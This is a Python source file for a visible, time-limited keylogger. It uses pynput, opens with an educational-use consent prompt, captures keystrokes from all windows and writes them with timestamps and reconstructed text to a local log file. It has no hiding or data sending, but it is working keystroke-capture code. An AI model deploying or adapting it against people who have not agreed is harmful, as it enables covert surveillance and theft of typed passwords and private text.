import pynput
import time
import sys
import os
import re
from datetime import datetime

# Log file path
log_file = "key_log.txt"

# Stores each keystroke individually with timestamp
keystroke_log = []

# Stores characters for building combined readable text
text_buffer = []


def get_timestamp():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S.") + f"{now.microsecond // 1000:03d}"


def format_time(seconds):
    seconds = max(0, int(seconds))
    hrs = seconds // 3600
    mins = (seconds % 3600) // 60
    secs = seconds % 60
    if hrs > 0:
        return f"{hrs:02d}:{mins:02d}:{secs:02d}"
    return f"{mins:02d}:{secs:02d}"


def format_duration_readable(seconds):
    if seconds >= 3600:
        value = seconds / 3600
        unit = "hour" if value == 1 else "hours"
        return f"{value:g} {unit}"
    elif seconds >= 60:
        value = seconds / 60
        unit = "minute" if value == 1 else "minutes"
        return f"{value:g} {unit}"
    unit = "second" if seconds == 1 else "seconds"
    return f"{seconds} {unit}"


def parse_duration(input_str):
    input_str = input_str.strip().lower()
    match = re.match(r'^(\d+\.?\d*)\s*([hms])?$', input_str)
    if not match:
        return None
    value = float(match.group(1))
    unit = match.group(2)
    if unit == 'h':
        return max(1, int(value * 3600))
    elif unit == 'm':
        return max(1, int(value * 60))
    return max(1, int(value))


def progress_bar(pct, width=30):
    filled = int(width * pct / 100)
    return "█" * filled + "░" * (width - filled)


# Capture each keystroke
def log_key(key):
    ts = get_timestamp()

    try:
        char = key.char
        if char is not None:
            keystroke_log.append((ts, char))
            text_buffer.append(char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            keystroke_log.append((ts, "[SPACE]"))
            text_buffer.append(" ")
        elif key == pynput.keyboard.Key.enter:
            keystroke_log.append((ts, "[ENTER]"))
            text_buffer.append("\n")
        elif key == pynput.keyboard.Key.tab:
            keystroke_log.append((ts, "[TAB]"))
            text_buffer.append("\t")
        elif key == pynput.keyboard.Key.backspace:
            keystroke_log.append((ts, "[BACKSPACE]"))
            if text_buffer:
                text_buffer.pop()
        elif key in (pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r):
            pass  # Ignore shift silently
        else:
            name = str(key).replace("Key.", "").upper()
            keystroke_log.append((ts, f"[{name}]"))


# Write everything to the log file
def write_log(duration):
    with open(log_file, "w", encoding="utf-8") as f:
        # ── Header ──
        f.write(f"{'='*60}\n")
        f.write(f"  KEYLOGGER SESSION LOG\n")
        f.write(f"  Date      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"  Duration  : {format_duration_readable(duration)}\n")
        f.write(f"  Total Keys: {len(keystroke_log)}\n")
        f.write(f"{'='*60}\n\n\n")

        # ── Section 1: Individual Keystrokes ──
        f.write(f"{'─'*60}\n")
        f.write(f"  SECTION 1: INDIVIDUAL KEYSTROKE LOG\n")
        f.write(f"{'─'*60}\n\n")

        if keystroke_log:
            for ts, key_data in keystroke_log:
                f.write(f"  {ts}  │  {key_data}\n")
        else:
            f.write("  (No keystrokes recorded)\n")

        # ── Section 2: Combined Readable Text ──
        f.write(f"\n\n{'─'*60}\n")
        f.write(f"  SECTION 2: COMBINED TEXT OUTPUT\n")
        f.write(f"{'─'*60}\n\n")

        combined = "".join(text_buffer)
        if combined.strip():
            for line in combined.split("\n"):
                f.write(f"  {line}\n")
        else:
            f.write("  (No readable text captured)\n")

        # ── Footer ──
        f.write(f"\n{'='*60}\n")
        f.write(f"  END OF LOG\n")
        f.write(f"{'='*60}\n")


def show_disclaimer():
    print()
    print("  ╔════════════════════════════════════════════════════╗")
    print("  ║           ETHICAL KEYLOGGER NOTICE                 ║")
    print("  ╠════════════════════════════════════════════════════╣")
    print("  ║  This program is for educational purposes only.   ║")
    print("  ║  You must obtain permission before using it.      ║")
    print("  ╠════════════════════════════════════════════════════╣")
    print("  ║  By using this software, you agree to:            ║")
    print("  ║  1. You have permission to log keystrokes.        ║")
    print("  ║  2. You will not use it to break any laws.        ║")
    print("  ║  3. You are responsible for data collected.       ║")
    print("  ╚════════════════════════════════════════════════════╝")

    consent = input("\n  Do you accept these terms? (y/n): ").strip().lower()
    if consent != 'y':
        print("\n  You must agree to the terms to use this program.")
        sys.exit()


def get_duration():
    print("\n  Enter logging duration:")
    print("  Examples: 30 (seconds) | 5m (minutes) | 1.5h (hours)")
    raw = input("\n  Duration: ").strip()

    dur = parse_duration(raw)
    if dur is None or dur <= 0:
        print("\n  Invalid input! Examples: 60, 5m, 1.5h")
        sys.exit()
    return dur


def start_keylogger():
    show_disclaimer()
    duration = get_duration()
    readable = format_duration_readable(duration)

    print(f"\n  Logging for {readable}. Switch to any other window and type!")
    print(f"  Log file: {log_file}\n")

    with pynput.keyboard.Listener(on_press=log_key) as listener:
        start_time = time.time()

        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            pct = min((elapsed / duration) * 100, 100)
            bar = progress_bar(pct)
            keys = len(keystroke_log)

            sys.stdout.write(
                f"\r  ⏱  {format_time(remaining)}  │{bar}│ {pct:5.1f}%  │  Keys: {keys}  "
            )
            sys.stdout.flush()
            time.sleep(0.5)

        # Final line
        total = len(keystroke_log)
        sys.stdout.write(
            f"\r  ☑ {format_time(0)}   │{'█' * 30}│ 100.0%  │  Keys: {total}  \n"
        )
        sys.stdout.flush()
        listener.stop()

    write_log(duration)

    print(f"\n  Logging complete! Total keystrokes: {len(keystroke_log)}")
    print(f"  Saved to: {os.path.abspath(log_file)}\n")


if __name__ == "__main__":
    start_keylogger()